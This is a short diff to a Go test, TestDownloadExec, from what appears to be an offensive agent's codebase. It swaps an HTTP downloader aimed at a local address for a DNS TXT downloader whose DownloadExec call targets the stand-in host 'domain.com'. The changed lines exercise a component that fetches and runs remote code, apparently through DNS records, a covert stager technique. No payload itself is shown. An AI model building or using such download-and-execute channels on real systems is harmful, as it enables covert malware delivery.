@@ -5,6 +5,6 @@ import (
 )
 
 func TestDownloadExec(t *testing.T) {
-	d := NewHttpDownloader("agent")
-	d.DownloadExec("http://127.0.0.1:8000/exec")
+	d := NewDnsTxtDownloader()
+	d.DownloadExec("domain.com")
 }
